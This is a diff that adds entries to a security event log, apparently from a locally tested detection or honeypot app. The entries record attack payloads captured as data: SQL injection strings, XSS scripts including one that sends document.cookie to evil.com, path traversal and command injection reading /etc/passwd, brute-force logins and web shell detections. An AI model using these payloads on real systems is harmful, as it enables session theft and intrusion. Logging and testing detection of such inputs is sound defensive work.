@@ -12,3 +12,52 @@
 2026-03-05T15:14:26.704587,127.0.0.1,web_shell_detection,filename=shell.php  hash=86b0eea46ef9d06f7bfadbd02632f60828c4eb2cd3de3d47e4e9c0291d532778  size=30
 2026-03-05T15:18:27.786309,127.0.0.1,brute_force_attempt,username=lodu  password=ldou
 2026-03-05T15:18:32.420967,127.0.0.1,brute_force_attempt,username=Kai  password=antidote-blabber-overdue
+2026-03-05T20:01:52.823539,127.0.0.1,brute_force_attempt,username=admin  password=password
+2026-03-05T20:03:59.647053,127.0.0.1,sql_injection,username=admin' OR '1'='1  password=password
+2026-03-05T20:04:02.690812,127.0.0.1,xss,username=admin  password=<script>alert('XSS')</script>
+2026-03-05T20:04:05.718444,127.0.0.1,path_traversal,file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2026-03-05T20:04:08.749840,127.0.0.1,path_traversal,cmd=%3Bcat+%2Fetc%2Fpasswd
+2026-03-05T20:04:11.815561,127.0.0.1,xss,name=Hacker  email=test@test.com  message=<script>fetch('http://evil.com?c=' + document.cookie)</scr
+2026-03-05T20:04:14.870362,127.0.0.1,sql_injection,email=admin@gsi.corp' OR '1'='1
+2026-03-05T20:04:17.918161,127.0.0.1,brute_force_attempt,username=admin  password=wrongpassword
+2026-03-06T12:38:29.402698,127.0.0.1,Command Injection,username=admin' OR '1'='1  password=password
+2026-03-06T12:38:32.469489,127.0.0.1,Cross-Site Scripting (XSS),username=admin  password=<script>alert('XSS')</script>
+2026-03-06T12:38:35.532975,127.0.0.1,path_traversal,file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2026-03-06T12:38:38.571350,127.0.0.1,path_traversal,cmd=%3Bcat+%2Fetc%2Fpasswd
+2026-03-06T12:38:41.644387,127.0.0.1,Cross-Site Scripting (XSS),name=Hacker  email=test@test.com  message=<script>fetch('http://evil.com?c=' + document.cookie)</scr
+2026-03-06T12:38:44.710963,127.0.0.1,Command Injection,email=admin@gsi.corp' OR '1'='1
+2026-03-06T12:38:47.802714,127.0.0.1,Brute Force Login,username=admin  password=wrongpassword
+2026-03-06T12:38:50.902747,127.0.0.1,web_shell_detection,filename=shell.php  hash=86b0eea46ef9d06f7bfadbd02632f60828c4eb2cd3de3d47e4e9c0291d532778  size=30
+2026-04-24T11:49:42.117384,127.0.0.1,Command Injection,username=admin' OR '1'='1  password=password
+2026-04-24T11:49:45.185602,127.0.0.1,Cross-Site Scripting (XSS),username=admin  password=<script>alert('XSS')</script>
+2026-04-24T11:49:48.218565,127.0.0.1,path_traversal,file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2026-04-24T11:49:51.270226,127.0.0.1,path_traversal,cmd=%3Bcat+%2Fetc%2Fpasswd
+2026-04-24T11:49:54.332891,127.0.0.1,Cross-Site Scripting (XSS),name=Hacker  email=test@test.com  message=<script>fetch('http://evil.com?c=' + document.cookie)</scr
+2026-04-24T11:49:57.383540,127.0.0.1,Command Injection,email=admin@gsi.corp' OR '1'='1
+2026-04-24T11:50:00.461453,127.0.0.1,Brute Force Login,username=admin  password=wrongpassword
+2026-04-24T11:50:03.512047,127.0.0.1,web_shell_detection,filename=shell.php  hash=86b0eea46ef9d06f7bfadbd02632f60828c4eb2cd3de3d47e4e9c0291d532778  size=30
+2026-04-24T12:40:25.932371,127.0.0.1,Command Injection,username=admin' OR '1'='1  password=password
+2026-04-24T12:40:29.860149,127.0.0.1,Cross-Site Scripting (XSS),username=admin  password=<script>alert('XSS')</script>
+2026-04-24T12:40:33.095900,127.0.0.1,path_traversal,file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2026-04-24T12:40:36.262138,127.0.0.1,path_traversal,cmd=%3Bcat+%2Fetc%2Fpasswd
+2026-04-24T12:40:39.651329,127.0.0.1,Cross-Site Scripting (XSS),name=Hacker  email=test@test.com  message=<script>fetch('http://evil.com?c=' + document.cookie)</scr
+2026-04-24T12:40:42.879690,127.0.0.1,Command Injection,email=admin@gsi.corp' OR '1'='1
+2026-04-24T12:40:46.174715,127.0.0.1,Brute Force Login,username=admin  password=wrongpassword
+2026-04-24T12:40:49.322250,127.0.0.1,web_shell_detection,filename=shell.php  hash=86b0eea46ef9d06f7bfadbd02632f60828c4eb2cd3de3d47e4e9c0291d532778  size=30
+2026-04-24T12:57:04.211314,127.0.0.1,Brute Force Login,username=admin  password=password
+2026-04-24T13:00:54.682279,127.0.0.1,Command Injection,username=admin' OR '1'='1  password=password
+2026-04-24T13:00:57.821698,127.0.0.1,Cross-Site Scripting (XSS),username=admin  password=<script>alert('XSS')</script>
+2026-04-24T13:01:00.987709,127.0.0.1,path_traversal,file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2026-04-24T13:01:04.052438,127.0.0.1,path_traversal,cmd=%3Bcat+%2Fetc%2Fpasswd
+2026-04-24T13:01:07.166818,127.0.0.1,Cross-Site Scripting (XSS),name=Hacker  email=test@test.com  message=<script>fetch('http://evil.com?c=' + document.cookie)</scr
+2026-04-24T13:01:10.268076,127.0.0.1,Command Injection,email=admin@gsi.corp' OR '1'='1
+2026-04-24T13:01:13.431259,127.0.0.1,Brute Force Login,username=admin  password=wrongpassword
+2026-04-24T13:01:16.490828,127.0.0.1,web_shell_detection,filename=shell.php  hash=86b0eea46ef9d06f7bfadbd02632f60828c4eb2cd3de3d47e4e9c0291d532778  size=30
+2026-04-24T13:03:29.936149,127.0.0.1,Command Injection,username=admin' OR '1'='1  password=password
+2026-04-24T13:03:33.046810,127.0.0.1,Cross-Site Scripting (XSS),username=admin  password=<script>alert('XSS')</script>
+2026-04-24T13:03:36.142918,127.0.0.1,path_traversal,file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2026-04-24T13:03:39.209994,127.0.0.1,path_traversal,cmd=%3Bcat+%2Fetc%2Fpasswd
+2026-04-24T13:03:42.409075,127.0.0.1,Cross-Site Scripting (XSS),name=Hacker  email=test@test.com  message=<script>fetch('http://evil.com?c=' + document.cookie)</scr
+2026-04-24T13:03:45.559244,127.0.0.1,Command Injection,email=admin@gsi.corp' OR '1'='1
+2026-04-24T13:03:48.671680,127.0.0.1,Brute Force Login,username=admin  password=wrongpassword
+2026-04-24T13:03:51.734043,127.0.0.1,web_shell_detection,filename=shell.php  hash=86b0eea46ef9d06f7bfadbd02632f60828c4eb2cd3de3d47e4e9c0291d532778  size=30
